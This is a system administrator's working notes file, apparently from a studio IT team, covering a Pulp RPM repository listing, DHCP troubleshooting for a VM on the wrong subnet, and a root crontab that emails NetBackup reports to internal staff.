   lrwxrwxrwx 1 apache apache 77 Jun 25 16:35 sw -> /var/lib/pulp/published/yum/master/yum_distributor/dts-7w_dts-sw/1529969730.2
   lrwxrwxrwx 1 apache apache 83 Aug  9  2017 updates -> /var/lib/pulp/published/yum/master/yum_distributor/dts-7w_dts-updates/1502317879.31

cd /var/lib/pulp/published/yum/master/yum_distributor/dts-7w_dts-sw/1529969730.2

[root@chug 1529969730.2]# ll | grep gulliver
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.19.g341b943-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/0b/28397e9bb6a0d28bb1042d19b2ea28e4a2c42078b2fd21c6997f1cde504d67/gulliver-1.0.5.19.g341b943-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.26.gf87836c-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/2a/f028813bc2b56af1ad57b517f4e66ade8d7d1198897037837c8a65a90023ba/gulliver-1.0.5.26.gf87836c-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.27.g2149cee-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/b0/7d246dd39921d9d94d0dcf0777fe0d84e974d6f29c7f58ba4f919177cb911f/gulliver-1.0.5.27.g2149cee-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.28.g6a0ada9-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/d4/56b42c723c35ab5968ef163134b61ab7ab75ec57f98fc071eaf99fe89573bb/gulliver-1.0.5.28.g6a0ada9-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.29.gc2449a2-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/ad/f99f6a95c8cba0568483cea40f0bada29b239f552a951a597f7a03a46e6b1c/gulliver-1.0.5.29.gc2449a2-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.30.g22a30dd-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/fc/46a6029344c3e4e8902832aaf4f68282393e70805c1e17a0a0116cffbd5d22/gulliver-1.0.5.30.g22a30dd-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.32.gb7869f0-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/84/91ae3de3f698d2981b22244c8a3e4e981b159559626d9188b4f1b520b5710e/gulliver-1.0.5.32.gb7869f0-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.33.ga3603aa-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/09/e1035ca81f63b8b9d21f0ed38ccfb6e701f49c292cf652e6fc07c00c11cabd/gulliver-1.0.5.33.ga3603aa-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.36.g1f43477-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/7a/6e2b68de702a793f39778f3fc712b4e88e480aa3aed9d511a82d77ff593f6a/gulliver-1.0.5.36.g1f43477-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.37.g5bb92bc-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/c8/25ec6f69d22cb21e3acaf03ae99b0d85f8d5d12d0a27001ccf6314d22f1733/gulliver-1.0.5.37.g5bb92bc-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.38.g08d927e-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/49/b515e1b2859388ff8aa41b5d813e673f11f7a00292cccb7baac20df6559a30/gulliver-1.0.5.38.g08d927e-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.39.g8c75c70-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/6a/b445ce3e81ef467cc953a1316df68ef917783a3d7361728edb79c0af28a08f/gulliver-1.0.5.39.g8c75c70-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.40.g1518589-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/33/16166cb18cca2891f6421362bad4c4b328879fe4ba4130a44c1d10333cebcf/gulliver-1.0.5.40.g1518589-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.41.gd7b7721-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/6a/5ccd415f066562f6a17ad8d63bfc228c13a5e8e7c2dfab28ab671b3ede8338/gulliver-1.0.5.41.gd7b7721-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.42.gb2c2eaf-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/c5/c9a2caf4afa454efa65f47bbd5741b9065b57eb886d6517a17988c1e70a84e/gulliver-1.0.5.42.gb2c2eaf-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.43.gbfd7f7b-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/69/e969e330d69711a7bbe19cc2a58cc9e9afe8b336de80828b5c8d180f934cdc/gulliver-1.0.5.43.gbfd7f7b-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.44.g67028fe-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/30/25751ba59d2b79b68e9109af2dd5e47d432ca69d8c4f52ad7a9033df1000c1/gulliver-1.0.5.44.g67028fe-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.45.g49ac0ef-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/e8/8cb74c832064a3050ccd0c870dcff68e6e17e081e60685e26b5ecb80da69df/gulliver-1.0.5.45.g49ac0ef-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.46.ge631e3e-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/17/3bcbdffaa1f6c8ddf862eba96bc9755e6e89dadec38a1c7197bce59a4de3cb/gulliver-1.0.5.46.ge631e3e-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.47.gf15c973-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/8b/52d629a81fef2ac3612c221c2f11033b4dad0af0a87049716b80f4e70f15f1/gulliver-1.0.5.47.gf15c973-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.49.g20e45f2-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/64/3983c1b99dba7609c6cc17de1a74931d814acbaea24b459aa4562547f3769a/gulliver-1.0.5.49.g20e45f2-1.dts.el7.noarch.rpm
lrwxrwxrwx 1 apache apache 145 Jun 25 16:35 gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm -> /var/lib/pulp/content/units/rpm/17/83bdd2fc77adeb4835fd28c69d84cdbd141ebfe9054651f530161d2d4522fd/gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm

cd /var/lib/pulp/content/units/rpm/17/83bdd2fc77adeb4835fd28c69d84cdbd141ebfe9054651f530161d2d4522fd/
@@@ VERY long

cd /var/lib/pulp/content/units/rpm/17
[root@chug 17]# ll | grep 83bd
drwxr-xr-x 2 apache apache 65 Jun  7 11:01 83bdd2fc77adeb4835fd28c69d84cdbd141ebfe9054651f530161d2d4522fd

[root@chug 17]# ll 83bdd2fc77adeb4835fd28c69d84cdbd141ebfe9054651f530161d2d4522fd
total 242
-rw-r--r-- 1 apache apache 73764 Jun  7 11:01 gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm

file gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm 
gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm: RPM v3.0 bin i386/x86_64 gulliver-1:1.0.5.52.gb4b0c72-1.dts.el7

md5sum gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm 
2a52d81cc2e1482d81ae325afb5dfacd  gulliver-1.0.5.52.gb4b0c72-1.dts.el7.noarch.rpm



******************************************************************************************************
21jun18  tracking DHCP offerings

cat /var/log/messages | grep -vi pulp | grep -v qpidd| grep -vi puppet | grep -v goferd| grep -vi avid | grep -v automount

CLIENT -> DHCPDISCOVER
SERVER -> DHCPOFFER
CLIENT -> DHCPREQUEST
SERVER -> DHCPACK

cat /var/log/dhcpd.log

@@@ this is Amy trying to create a VM....

tail -f /var/log/dhcpd.log
{SNIP}
Jun 21 11:50:02 chug dhcpd: DHCPDISCOVER from 00:50:56:9c:d3:83 via eth0
Jun 21 11:50:02 chug dhcpd: DHCPDISCOVER from 00:50:56:9c:d3:83 via eth0
{SNIP}

@@@ what a DHCP exchange should look like...

Jun 21 15:52:22 chug dhcpd: DHCPDISCOVER from ac:87:a3:17:c8:4c (auriol) via 10.106.227.254
Jun 21 15:52:22 chug dhcpd: DHCPDISCOVER from ac:87:a3:17:c8:4c (auriol) via 10.106.227.254
Jun 21 15:52:23 chug dhcpd: DHCPOFFER on 10.106.224.207 to ac:87:a3:17:c8:4c (auriol) via 10.106.227.254
Jun 21 15:52:23 chug dhcpd: DHCPOFFER on 10.106.224.207 to ac:87:a3:17:c8:4c (auriol) via 10.106.227.254
Jun 21 15:52:24 chug dhcpd: DHCPREQUEST for 10.106.224.207 (10.106.228.21) from ac:87:a3:17:c8:4c (auriol) via 10.106.227.254
Jun 21 15:52:24 chug dhcpd: DHCPACK on 10.106.224.207 to ac:87:a3:17:c8:4c (auriol) via 10.106.227.254

25Jun18

https://access.redhat.com/solutions/3141231

No Presto metadata available for a repository

Resolution:
It is safe to ignore as this message as it is displayed as informational only. This will not prevent the packages from being downloaded.

26Jun18  FINALLY got some Grace time

@@@ long story short because it is a VM it has to be in "Prod data center" IP group (under subnet)
    we were not getting DHCPOFFER because we were in the wrong subnet (datacenter vs production floor)
    this is based on the workstation is "assumed" to be bare metal desktop (not a VM)


******************************************************************************************************
25Jun18 netbackup BIOTCH

ssh root@mungo

[root@mungo ~]# crontab -l
0 9 * * 1-5 /disney/depts/tech/systems/backops/netbackup/scripts/breport6 | mail -s "DTS NetBackup Problem Report" -r grace.thompson@disneytoonstudios.com don.siegfriedt@disneytoonstudios.com > /dev/null 2>&1
0 10 * * 1-5 (echo "To: grace.thompson@disneytoonstudios.com don.siegfriedt@disneytoonstudios.com";echo "From: grace.thompson@disneytoonstudios.com";echo "Subject: DTS NetBackup Bad Status Report";echo 'MIME-Version: 1.0';echo 'Content-Type: text/html';echo 'Content-Disposition: inline';echo '<font size=2>';echo "<pre>";/disney/depts/tech/systems/backops/netbackup/scripts/nb_bad_status_report.pl;echo '</pre>') | /usr/lib/sendmail -t -f grace.thompson@disneytoonstudios.com don.siegfriedt@disneytoonstudios.com > /dev/null 2>&1
0 14 * * 1-5 (echo "To: grace.thompson@disneytoonstudios.com maya.karp@disneytoonstudios.com cole.peterson@disneytoonstudios.com don.siegfriedt@disneytoonstudios.com";echo "From: grace.thompson@disneytoonstudios.com";echo "Subject: DTS NetBackup Tape Report";echo 'MIME-Version: 1.0';echo 'Content-Type: text/html';echo 'Content-Disposition: inline';echo '<font size=2>';echo "<pre>";/disney/depts/tech/systems/backops/netbackup/scripts/dts_tape_count.pl;echo '</pre>') | /usr/lib/sendmail -t -f grace.thompson@disneytoonstudios.com > /dev/null 2>&1
#0 8,12,16,20 * * * /disney/depts/tech/systems/backops/netbackup/scripts/dts_tape_count.pl > /dev/null 2>&1
# netbackup size report
1 9 * * * /disney/depts/tech/systems/backops/netbackup/scripts/nb_size_report.pl 7 > /dev/null 2>&1
# vmware backup check
2 9 * * 1 /disney/depts/tech/systems/backops/vmware/scripts/chk_vmware_backups.sh > /dev/null 2>&1
# check volumes on dts-avid-backup
05 08,17 * * 1-5 /disney/depts/tech/systems/backops/netbackup/scripts/dts-avid-backup_isisbackup.py > /dev/null 2>&1
# report on media errors from /usr/openv/netbackup/db/media/errors
30 20 * * * /disney/depts/tech/systems/backops/netbackup/scripts/media_errors.pl > /dev/null 2>&1
# check cleaning tapes for number of cleanings left.
32 05 * * * /disney/depts/tech/systems/backops/netbackup/scripts/status_hcart_cln_media.py > /dev/null 2>&1
# create/update netbackup theorem policies
01 7 * * 1-6 /disney/depts/tech/systems/backops/netbackup/scripts/thatcher_theorem.sh > /dev/null 2>&1


@@@ to get a scratch count
/disney/depts/tech/systems/backops/netbackup/scripts/dts_tape_count.pl


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************



******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************



******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************



******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************


******************************************************************************************************



